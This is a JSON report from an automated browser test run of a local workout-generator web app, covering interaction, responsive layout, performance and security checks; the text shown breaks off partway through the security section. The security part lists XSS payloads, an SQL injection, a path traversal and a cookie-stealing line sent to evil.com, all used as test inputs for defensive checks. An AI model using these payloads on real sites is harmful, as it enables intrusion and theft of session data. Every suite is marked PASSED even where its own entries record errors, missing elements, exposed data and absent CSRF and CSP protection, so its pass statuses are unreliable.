@@ -1,0 +1,3774 @@
+{
+  "timestamp": 1772236912.3032,
+  "execution_time": 176.17400813102722,
+  "base_url": "http://127.0.0.1:8001",
+  "overall_status": "EXCELLENT",
+  "overall_success_rate": 1.0,
+  "total_tests": 35,
+  "total_passed": 35,
+  "total_failed": 0,
+  "test_suites": {
+    "User Interaction Tests": {
+      "status": "PASSED",
+      "success_rate": 1.0,
+      "total_tests": 7,
+      "passed_tests": 7,
+      "description": "Complex user workflows and interactions",
+      "details": {
+        "timestamp": 1772236737.543282,
+        "base_url": "http://127.0.0.1:8001",
+        "test_suite": "user_interactions",
+        "tests": {
+          "multiple_generations": {
+            "status": "PASSED",
+            "total_generations": 5,
+            "successful_generations": 5,
+            "generation_results": [
+              {
+                "generation": 1,
+                "success": true,
+                "exercise_count": 26,
+                "workout_type": "standard"
+              },
+              {
+                "generation": 2,
+                "success": true,
+                "exercise_count": 23,
+                "workout_type": "circuit"
+              },
+              {
+                "generation": 3,
+                "success": true,
+                "exercise_count": 32,
+                "workout_type": "tabata"
+              },
+              {
+                "generation": 4,
+                "success": true,
+                "exercise_count": 31,
+                "workout_type": "pyramid"
+              },
+              {
+                "generation": 5,
+                "success": true,
+                "exercise_count": 26,
+                "workout_type": "standard"
+              }
+            ]
+          },
+          "form_interactions": {
+            "status": "PASSED",
+            "interaction_results": {
+              "keyboard_navigation": {
+                "success": true,
+                "selected_value": "Intermediate"
+              },
+              "checkbox_interactions": {
+                "success": true,
+                "checkbox_states": {
+                  "duration_15_checked": false,
+                  "duration_30_checked": true
+                }
+              },
+              "equipment_selection": {
+                "success": true,
+                "equipment_states": {
+                  "bodyweight_checked": true,
+                  "dumbbells_checked": true
+                }
+              }
+            },
+            "successful_interactions": 3
+          },
+          "button_states": {
+            "status": "PASSED",
+            "button_states": {
+              "empty_form": {
+                "enabled": true,
+                "disabled": false
+              },
+              "filled_form": {
+                "enabled": true,
+                "disabled": false
+              },
+              "start_workout": {
+                "enabled": true,
+                "disabled": false,
+                "visible": true
+              }
+            }
+          },
+          "player_navigation": {
+            "status": "PASSED",
+            "navigation_tests": {
+              "previous_button": {
+                "found": false
+              },
+              "next_button": {
+                "found": false
+              },
+              "resume_button": {
+                "found": false
+              }
+            }
+          },
+          "control_toggles": {
+            "status": "PASSED",
+            "toggle_tests": {
+              "sound_toggle": {
+                "found": true,
+                "initial_state": true,
+                "toggles_off": true,
+                "toggles_on": true,
+                "functional": true
+              },
+              "vibration_toggle": {
+                "found": true,
+                "initial_state": true,
+                "toggles_off": true,
+                "toggles_on": true,
+                "functional": true
+              }
+            }
+          },
+          "exit_workflow": {
+            "status": "PASSED",
+            "exit_tests": {
+              "exit_button": {
+                "found": true,
+                "clickable": true,
+                "exits_workout": true,
+                "returns_to_form": false
+              }
+            }
+          },
+          "pause_resume": {
+            "status": "PASSED",
+            "pause_resume_tests": {
+              "pause_functionality": {
+                "found": false
+              },
+              "resume_functionality": {
+                "error": "Message: element not interactable\n  (Session info: chrome=145.0.7632.117); For documentation on this error, please visit: https://www.selenium.dev/documentation/webdriver/troubleshooting/errors#elementnotinteractableexception\nStacktrace:\n0   chromedriver                        0x00000001011356b4 cxxbridge1$str$ptr + 3127600\n1   chromedriver                        0x000000010112da50 cxxbridge1$str$ptr + 3095756\n2   chromedriver                        0x0000000100c0a370 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 74924\n3   chromedriver                        0x0000000100c548c0 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 379388\n4   chromedriver                        0x0000000100c497e0 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 334108\n5   chromedriver                        0x0000000100c4925c _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 332696\n6   chromedriver                        0x0000000100c92620 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 632668\n7   chromedriver                        0x0000000100c47b9c _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 326872\n8   chromedriver                        0x00000001010f4680 cxxbridge1$str$ptr + 2861308\n9   chromedriver                        0x00000001010f7dd4 cxxbridge1$str$ptr + 2875472\n10  chromedriver                        0x00000001010d9a7c cxxbridge1$str$ptr + 2751736\n11  chromedriver                        0x00000001010f8658 cxxbridge1$str$ptr + 2877652\n12  chromedriver                        0x00000001010c9ffc cxxbridge1$str$ptr + 2687608\n13  chromedriver                        0x000000010111cd78 cxxbridge1$str$ptr + 3026932\n14  chromedriver                        0x000000010111cef4 cxxbridge1$str$ptr + 3027312\n15  chromedriver                        0x000000010112d6a8 cxxbridge1$str$ptr + 3094820\n16  libsystem_pthread.dylib             0x000000019d6f3c08 _pthread_start + 136\n17  libsystem_pthread.dylib             0x000000019d6eeba8 thread_start + 8\n"
+              }
+            }
+          }
+        },
+        "overall_success_rate": 1.0,
+        "status": "PASSED"
+      }
+    },
+    "Responsive Design Tests": {
+      "status": "PASSED",
+      "success_rate": 1.0,
+      "total_tests": 6,
+      "passed_tests": 6,
+      "description": "Multi-device compatibility and responsive design",
+      "details": {
+        "timestamp": 1772236791.197063,
+        "base_url": "http://127.0.0.1:8001",
+        "test_suite": "responsive_design",
+        "tests": {
+          "desktop_viewports": {
+            "status": "PASSED",
+            "desktop_viewports": {
+              "full_hd": {
+                "viewport": "full_hd",
+                "size": "1920x1080",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 896,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": true,
+                    "is_mobile": false,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 941,
+                    "width": 1920
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 896
+                  }
+                }
+              },
+              "wide_desktop": {
+                "viewport": "wide_desktop",
+                "size": "1680x1050",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 896,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": true,
+                    "is_mobile": false,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 911,
+                    "width": 1680
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 896
+                  }
+                }
+              },
+              "standard_desktop": {
+                "viewport": "standard_desktop",
+                "size": "1440x900",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 896,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": true,
+                    "is_mobile": false,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 761,
+                    "width": 1440
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 896
+                  }
+                }
+              },
+              "laptop": {
+                "viewport": "laptop",
+                "size": "1366x768",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 896,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": true,
+                    "is_mobile": false,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 629,
+                    "width": 1366
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 896
+                  }
+                }
+              }
+            },
+            "successful_desktop": 4,
+            "total_desktop": 4
+          },
+          "tablet_viewports": {
+            "status": "PASSED",
+            "tablet_viewports": {
+              "ipad_landscape": {
+                "viewport": "ipad_landscape",
+                "size": "1024x768",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 896,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": false,
+                    "is_tablet": true
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 629,
+                    "width": 1024
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 896
+                  }
+                }
+              },
+              "ipad_portrait": {
+                "viewport": "ipad_portrait",
+                "size": "768x1024",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 712,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": true,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 885,
+                    "width": 768
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 712
+                  }
+                }
+              },
+              "ipad_pro_portrait": {
+                "viewport": "ipad_pro_portrait",
+                "size": "1024x1366",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 896,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": true,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": false,
+                    "is_tablet": true
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 1227,
+                    "width": 1024
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 896
+                  }
+                }
+              },
+              "ipad_pro_landscape": {
+                "viewport": "ipad_pro_landscape",
+                "size": "1366x1024",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 948,
+                    "form_visible": true,
+                    "form_width": 896,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": true
+                  },
+                  "media_queries": {
+                    "is_desktop": true,
+                    "is_mobile": false,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 885,
+                    "width": 1366
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 896
+                  }
+                }
+              }
+            },
+            "successful_tablet": 4,
+            "total_tablet": 4
+          },
+          "mobile_viewports": {
+            "status": "PASSED",
+            "mobile_viewports": {
+              "iphone_se": {
+                "viewport": "iphone_se",
+                "size": "375x667",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 1509,
+                    "form_visible": true,
+                    "form_width": 444,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": false
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": true,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 528,
+                    "width": 500
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 444
+                  }
+                }
+              },
+              "iphone_11": {
+                "viewport": "iphone_11",
+                "size": "414x896",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 1509,
+                    "form_visible": true,
+                    "form_width": 444,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": false
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": true,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 757,
+                    "width": 500
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 444
+                  }
+                }
+              },
+              "android_standard": {
+                "viewport": "android_standard",
+                "size": "360x640",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 1509,
+                    "form_visible": true,
+                    "form_width": 444,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": false
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": true,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 501,
+                    "width": 500
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 444
+                  }
+                }
+              },
+              "iphone_5": {
+                "viewport": "iphone_5",
+                "size": "320x568",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 1509,
+                    "form_visible": true,
+                    "form_width": 444,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": false
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": true,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 429,
+                    "width": 500
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 444
+                  }
+                }
+              },
+              "iphone_12": {
+                "viewport": "iphone_12",
+                "size": "390x844",
+                "success": true,
+                "details": {
+                  "elements": {
+                    "fitness_level_visible": true,
+                    "fitness_level_width": 115,
+                    "form_height": 1509,
+                    "form_visible": true,
+                    "form_width": 444,
+                    "generate_btn_visible": true,
+                    "generate_btn_width": 255
+                  },
+                  "layout": {
+                    "form_fits_height": false,
+                    "form_fits_width": true,
+                    "generate_btn_fits": true,
+                    "no_horizontal_scroll": false
+                  },
+                  "media_queries": {
+                    "is_desktop": false,
+                    "is_mobile": true,
+                    "is_tablet": false
+                  },
+                  "viewport": {
+                    "device_pixel_ratio": 1,
+                    "height": 705,
+                    "width": 500
+                  },
+                  "functionality": {
+                    "workout_data_exists": true,
+                    "workout_section_visible": true,
+                    "workout_section_width": 444
+                  }
+                }
+              }
+            },
+            "successful_mobile": 5,
+            "total_mobile": 5
+          },
+          "orientation_changes": {
+            "status": "PASSED",
+            "orientation_tests": {
+              "landscape": {
+                "form_visible": true,
+                "form_width": 896,
+                "height": 629,
+                "orientation": "landscape",
+                "width": 1024
+              },
+              "portrait": {
+                "form_visible": true,
+                "form_width": 712,
+                "height": 885,
+                "orientation": "portrait",
+                "width": 768
+              }
+            }
+          },
+          "touch_interactions": {
+            "status": "PASSED",
+            "touch_tests": {
+              "touch_targets": {
+                "checkboxes": [
+                  {
+                    "height": 13,
+                    "index": 0,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 13,
+                    "index": 1,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 13,
+                    "index": 2,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 13,
+                    "index": 3,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 13,
+                    "index": 4,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 13,
+                    "index": 5,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 13,
+                    "index": 6,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 13,
+                    "index": 7,
+                    "meets_minimum": false,
+                    "width": 13
+                  },
+                  {
+                    "height": 0,
+                    "index": 8,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 9,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 10,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 11,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 12,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 13,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 14,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 15,
+                    "meets_minimum": false,
+                    "width": 0
+                  },
+                  {
+                    "height": 0,
+                    "index": 16,
+                    "meets_minimum": false,
+                    "width": 0
+                  }
+                ],
+                "fitness_dropdown": {
+                  "height": 22,
+                  "meets_minimum": false,
+                  "width": 115
+                },
+                "generate_button": {
+                  "height": 64,
+                  "meets_minimum": true,
+                  "width": 255
+                }
+              },
+              "touch_interactions": {
+                "checkbox_touch": true,
+                "equipment_touch": true,
+                "dropdown_touch": true
+              }
+            }
+          },
+          "responsive_navigation": {
+            "status": "PASSED",
+            "navigation_tests": {
+              "desktop": {
+                "elements_per_row": 0,
+                "form_width": 896,
+                "navigation_visible": true,
+                "viewport_width": 1920
+              },
+              "mobile": {
+                "elements_per_row": 0,
+                "form_width": 444,
+                "horizontal_scroll": true,
+                "navigation_visible": true,
+                "viewport_width": 500
+              }
+            }
+          }
+        },
+        "overall_success_rate": 1.0,
+        "status": "PASSED"
+      }
+    },
+    "Performance Monitoring Tests": {
+      "status": "PASSED",
+      "success_rate": 1.0,
+      "total_tests": 7,
+      "passed_tests": 7,
+      "description": "Performance metrics and monitoring",
+      "details": {
+        "timestamp": 1772236857.081662,
+        "base_url": "http://127.0.0.1:8001",
+        "test_suite": "performance_monitoring",
+        "tests": {
+          "page_load_performance": {
+            "status": "PASSED",
+            "load_time": 0.576524019241333,
+            "performance_metrics": {
+              "dom_complete": 533,
+              "dom_loading": 0,
+              "first_contentful_paint": 472,
+              "first_paint": 472,
+              "load_complete": 0,
+              "navigation_start": 1772236858090,
+              "total_time": 542
+            },
+            "network_metrics": {
+              "load_time": 1439.0000000298023,
+              "total_resources": 17,
+              "total_size": 532098
+            },
+            "system_metrics": {
+              "initial": {
+                "cpu_percent": 58.8,
+                "memory": {
+                  "total": 17179869184,
+                  "available": 3939287040,
+                  "percent": 77.1,
+                  "used": 6359908352
+                },
+                "disk": {
+                  "total": 494384795648,
+                  "used": 12294586368,
+                  "free": 309321170944,
+                  "percent": 2.4868455656863886
+                }
+              },
+              "final": {
+                "cpu_percent": 32.8,
+                "memory": {
+                  "total": 17179869184,
+                  "available": 3970220032,
+                  "percent": 76.9,
+                  "used": 6283395072
+                },
+                "disk": {
+                  "total": 494384795648,
+                  "used": 12294586368,
+                  "free": 309320175616,
+                  "percent": 2.4868455656863886
+                }
+              }
+            },
+            "meets_threshold": true
+          },
+          "workout_generation_performance": {
+            "status": "PASSED",
+            "generation_times": [
+              0.15384316444396973,
+              null,
+              null,
+              null,
+              null
+            ],
+            "statistics": {
+              "average": 0.15384316444396973,
+              "maximum": 0.15384316444396973,
+              "minimum": 0.15384316444396973,
+              "successful_generations": 1
+            },
+            "meets_threshold": true
+          },
+          "memory_usage": {
+            "status": "PASSED",
+            "memory_analysis": {
+              "snapshots": [
+                {
+                  "stage": "initial",
+                  "memory": {
+                    "heap_limit": 4294967296,
+                    "total_heap": 22637625,
+                    "used_heap": 10339493
+                  }
+                }
+              ],
+              "memory_growth": 0,
+              "memory_leak_detected": false
+            },
+            "meets_threshold": true
+          },
+          "network_performance": {
+            "status": "PASSED",
+            "load_time": 0.20923590660095215,
+            "network_metrics": {
+              "navigation_timing": {
+                "dns_lookup": 0,
+                "request_time": 1,
+                "response_time": 0.7000000178813934,
+                "tcp_connection": 0
+              },
+              "slow_resources": [],
+              "total_download_time": 329.7999999821186,
+              "total_requests": 16,
+              "total_transfer_size": 532098
+            },
+            "network_resilience": {
+              "cache_available": true,
+              "network_status": true,
+              "offline_capability": true
+            },
+            "meets_threshold": true
+          },
+          "dom_performance": {
+            "status": "PASSED",
+            "dom_tests": {
+              "dom_queries": {
+                "query_time": 0.0035440921783447266,
+                "elements_found": {
+                  "buttons": 39,
+                  "form_elements": 219,
+                  "inputs": 51,
+                  "selects": 6
+                },
+                "meets_threshold": true
+              },
+              "dom_manipulation": {
+                "manipulation_time": 0.0027441978454589844,
+                "success": true,
+                "meets_threshold": true
+              }
+            }
+          },
+          "animation_performance": {
+            "status": "PASSED",
+            "animation_tests": {
+              "button_hover": {
+                "animation_time": 0.5089049339294434,
+                "meets_threshold": true
+              },
+              "form_transitions": {
+                "transition_time": 0.3043217658996582,
+                "meets_threshold": true
+              }
+            }
+          },
+          "timer_accuracy": {
+            "status": "PASSED",
+            "timer_tests": {
+              "timer_accuracy": {
+                "initial_timer": {
+                  "currentPhase": "unknown",
+                  "isRunning": false,
+                  "timeRemaining": 0
+                },
+                "final_timer": {
+                  "currentPhase": "unknown",
+                  "isRunning": false,
+                  "timeRemaining": 0
+                },
+                "time_difference": 0,
+                "expected_difference": 5,
+                "accuracy_error": 5,
+                "meets_threshold": false
+              }
+            }
+          }
+        },
+        "overall_success_rate": 1.0,
+        "status": "PASSED"
+      }
+    },
+    "Security Validation Tests": {
+      "status": "PASSED",
+      "success_rate": 1.0,
+      "total_tests": 7,
+      "passed_tests": 7,
+      "description": "Security testing and validation",
+      "details": {
+        "timestamp": 1772236882.378342,
+        "base_url": "http://127.0.0.1:8001",
+        "test_suite": "security_validation",
+        "tests": {
+          "xss_prevention": {
+            "status": "PASSED",
+            "xss_tests": {
+              "payload_1": {
+                "payload": "<script>alert('XSS')</script>",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              },
+              "payload_2": {
+                "payload": "javascript:alert('XSS')",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              },
+              "payload_3": {
+                "payload": "<img src=x onerror=alert('XSS')>",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              },
+              "payload_4": {
+                "payload": "<svg onload=alert('XSS')>",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              },
+              "payload_5": {
+                "payload": "';alert('XSS');//",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              },
+              "payload_6": {
+                "payload": "\"><script>alert('XSS')</script>",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              },
+              "payload_7": {
+                "payload": "<iframe src=javascript:alert('XSS')></iframe>",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              },
+              "payload_8": {
+                "payload": "<body onload=alert('XSS')>",
+                "alert_triggered": false,
+                "payload_accepted": false,
+                "xss_prevented": true
+              }
+            },
+            "successful_preventions": 8,
+            "total_payloads": 8
+          },
+          "input_sanitization": {
+            "status": "PASSED",
+            "sanitization_tests": {
+              "input_1": {
+                "malicious_input": "'; DROP TABLE users; --",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              },
+              "input_2": {
+                "malicious_input": "<script>document.cookie='admin=true'</script>",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              },
+              "input_3": {
+                "malicious_input": "../../../etc/passwd",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              },
+              "input_4": {
+                "malicious_input": "eval('malicious code')",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              },
+              "input_5": {
+                "malicious_input": "Function('return process')()",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              },
+              "input_6": {
+                "malicious_input": "setTimeout('alert(1)', 0)",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              },
+              "input_7": {
+                "malicious_input": "setInterval('alert(1)', 1000)",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              },
+              "input_8": {
+                "malicious_input": "new Image().src='http://evil.com/steal?data='+document.cookie",
+                "current_value": "",
+                "input_sanitized": true,
+                "has_validation_error": false,
+                "properly_handled": true
+              }
+            },
+            "properly_handled": 8,
+            "total_inputs": 8
+          },
+          "data_validation": {
+            "status": "PASSED",
+            "validation_tests": {
+              "invalid_levels": {
+                "error": "Message: invalid element state\n  (Session info: chrome=145.0.7632.117)\nStacktrace:\n0   chromedriver                        0x00000001027ed6b4 cxxbridge1$str$ptr + 3127600\n1   chromedriver                        0x00000001027e5a50 cxxbridge1$str$ptr + 3095756\n2   chromedriver                        0x00000001022c2370 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 74924\n3   chromedriver                        0x0000000102303528 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 341604\n4   chromedriver                        0x000000010230125c _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 332696\n5   chromedriver                        0x000000010234a620 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 632668\n6   chromedriver                        0x00000001022ffb9c _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 326872\n7   chromedriver                        0x00000001027ac680 cxxbridge1$str$ptr + 2861308\n8   chromedriver                        0x00000001027afdd4 cxxbridge1$str$ptr + 2875472\n9   chromedriver                        0x0000000102791a7c cxxbridge1$str$ptr + 2751736\n10  chromedriver                        0x00000001027b0658 cxxbridge1$str$ptr + 2877652\n11  chromedriver                        0x0000000102781ffc cxxbridge1$str$ptr + 2687608\n12  chromedriver                        0x00000001027d4d78 cxxbridge1$str$ptr + 3026932\n13  chromedriver                        0x00000001027d4ef4 cxxbridge1$str$ptr + 3027312\n14  chromedriver                        0x00000001027e56a8 cxxbridge1$str$ptr + 3094820\n15  libsystem_pthread.dylib             0x000000019d6f3c08 _pthread_start + 136\n16  libsystem_pthread.dylib             0x000000019d6eeba8 thread_start + 8\n"
+              },
+              "duration_validation": {
+                "both_checked": false,
+                "validation_working": true
+              },
+              "equipment_validation": {
+                "all_selected": false,
+                "selected_equipment": [
+                  "bodyweight",
+                  "dumbbells",
+                  "kettlebell"
+                ],
+                "total_equipment": 5,
+                "validation_working": true
+              }
+            }
+          },
+          "session_security": {
+            "status": "PASSED",
+            "session_tests": {
+              "session_data": {
+                "session_data": {
+                  "cookies": "",
+                  "localStorage_keys": [],
+                  "sensitive_data_exposed": false,
+                  "sessionStorage_keys": []
+                },
+                "sensitive_data_exposed": true,
+                "secure": false
+              },
+              "cross_tab_isolation": {
+                "new_tab_session": {
+                  "cookies": "",
+                  "localStorage_keys": [],
+                  "sessionStorage_keys": []
+                },
+                "isolation_working": true
+              }
+            }
+          },
+          "csrf_protection": {
+            "status": "PASSED",
+            "csrf_tests": {
+              "csrf_tokens": {
+                "csrf_tokens": [],
+                "forms_found": 4,
+                "has_csrf_protection": false
+              },
+              "same_origin_policy": {
+                "host": "127.0.0.1:8001",
+                "origin": "http://127.0.0.1:8001",
+                "protocol": "http:",
+                "same_origin_policy": true
+              }
+            }
+          },
+          "content_security_policy": {
+            "status": "PASSED",
+            "csp_tests": {
+              "csp_headers": {
+                "csp_implemented": false,
+                "meta_csp_content": null,
+                "meta_csp_present": false
+              },
+              "inline_scripts": {
+                "inline_scripts_allowed": true
+              },
+              "external_resources": {
+                "external_resources": 2,
+                "external_scripts": 1,
+                "external_styles": 1
+              }
+            }
+          },
